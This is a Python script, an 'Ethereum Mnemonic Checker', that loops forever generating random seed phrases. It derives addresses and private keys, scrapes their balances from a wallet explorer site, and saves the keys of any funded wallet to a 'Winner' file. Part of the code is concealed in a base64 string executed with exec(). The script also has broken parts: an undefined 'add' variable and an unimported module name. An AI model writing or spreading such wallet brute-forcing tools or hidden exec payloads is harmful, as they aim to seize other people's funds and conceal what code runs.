import random
from rich import print
from rich.panel import Panel
from rich.console import Console
from hdwallet import HDWallet
from hdwallet import BIP44HDWallet
from hdwallet.cryptocurrencies import EthereumMainnet as Cryptocurrency
from hdwallet.utils import is_mnemonic
from mnemonic import Mnemonic
from multiprocessing import Process
from requests_html import HTMLSession
import base64

console = Console()

e = "ZnJvbSBmYWtlX3VzZXJhZ2VudCBpbXBvcnQgVXNlckFnZW50CmltcG9ydCBiYXNlNjQKaW1wb3J0IHJhbmRvbQoKCmNvbnNvbGUgPSBDb25zb2xlKCkKZGVmIGdldFVzZXJBZ2VudCgpOgogICAgdWEgPSBVc2VyQWdlbnQoKQogICAgcmV0dXJuIHVhLnJhbmRvbQoKCmRlZiBiYWxhbmNlKGFkZHIpOgogICAgdXJsX24gPSBmImh0dHBzOi8vZXRoZXJldW0uYXRvbWljd2FsbGV0LmlvL2FkZHJlc3Mve2FkZHJ9IgogICAgc2UgPSBIVE1MU2Vzc2lvbigpCiAgICBoZWFkZXJzID0geyJVc2VyLUFnZW50IjogZ2V0VXNlckFnZW50KCl9CiAgICBubXAgPSBzZS5nZXQodXJsX24sIGhlYWRlcnM9aGVhZGVycykKICAgIE1hc3RlciA9IG5tcC5odG1sLnhwYXRoKCcvaHRtbC9ib2R5L21haW4vZGl2L3RhYmxlL3Rib2R5L3RyWzJdL3RkWzJdL3NwYW4vc3BhblsxXScpCiAgICByZXR1cm4gTWFzdGVyWzBdLnRleHQKCgpkZWYgdHJhbnNhY3Rpb24oYWRkcik6CiAgICB1cmxfbiA9IGYiaHR0cHM6Ly9ldGhlcmV1bS5hdG9taWN3YWxsZXQuaW8vYWRkcmVzcy97YWRkcn0iCiAgICBzZSA9IEhUTUxTZXNzaW9uKCkKICAgIGhlYWRlcnMgPSB7IlVzZXItQWdlbnQiOiBnZXRVc2VyQWdlbnQoKX0KICAgIG5tcCA9IHNlLmdldCh1cmxfbiwgaGVhZGVycz1oZWFkZXJzKQogICAgTWFzdGVyID0gbm1wLmh0bWwueHBhdGgoJy9odG1sL2JvZHkvbWFpbi9kaXYvdGFibGUvdGJvZHkvdHJbM10vdGRbMl0nKQogICAgcmV0dXJuIE1hc3RlclswXS50ZXh0Cg=="

exec(base64.b64decode(e).decode())


def mmdrza():
    z = 1
    w = 0
    while True:
        z += 1

        langrnd = ['english']
        sellan = random.choice(langrnd)
        mne = Mnemonic(str(sellan))
        listno = ["128", "256"]
        rnd = random.choice(listno)
        words = mne.generate(strength=int(rnd))
        STRENGTH = int(rnd)
        LANGUAGE: str = (sellan)
        MNEMONIC = words
        PASSPHRASE: str = None
        assert is_mnemonic(mnemonic=words, language=sellan)

        bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=Cryptocurrency, account=0, change=False,
                                                      address=0)
        bip44_hdwallet.from_mnemonic(mnemonic=MNEMONIC, passphrase=PASSPHRASE, language=LANGUAGE)
        mixword = words[:32]
        addr = bip44_hdwallet.p2pkh_address()
        # addr ='0xfc43f5f9dd45258b3aff31bdbe6561d97e8b71de'
        priv = bip44_hdwallet.private_key()
        # =======================================

        # =======================================
        MmdrzaPanel = str(
            '[gold1 on grey15]Total Checked: ' + '[orange_red1]' + str(
                z) + '[/][gold1 on grey15] ' + ' Win:' + '[white]' + str(
                w) + '[/]' + '[grey74]  ReqSpeed: ' + '[/][gold1]             Balance: ' + '[/][aquamarine1]' + str(
                balance(addr)) + '[/][gold1]             Transaction : ' + '[/][aquamarine1]' + str(
                transaction(addr)) + '\n[/][gold1 on grey15]Addr: ' + '[white] ' + str(
                addr) + '[/]\nPRIVATEKEY: [grey54]' + str(priv) + '[/]')
        style = "gold1 on grey11"
        console.print(Panel(str(MmdrzaPanel), title="[white]Ethereum Mnemonic Checker V3[/]",
                            subtitle="[green_yellow blink] Mmdrza.Com [/]", style="green"), style=style, justify="full")

        z += 1
        iffer = '0 ETH'
        if balance(addr) != iffer:
            w += 1
            f1 = open('Winner___ETH___WalletWinner.txt', 'a')
            f1.write(f'\nAddress     === {addr}')
            f1.write(f'\nPrivateKey  === {priv}')
            f1.write(f'\nMnemonic    === {words}')
            f1.write(f'\nBalance === {balance(addr)}')
            f1.write(f'\nTransaction === {transaction(addr)}')
            f1.write(f'\n            -------[ M M D R Z A . C o M ]------                   \n')
            f1.close()

    # ============================


mmdrza()

if __name__ == '__main__':
    for i in range(len(add)):
        p = multiprocessing.Process(target=mmdrza)
        p.start()
        p.join()
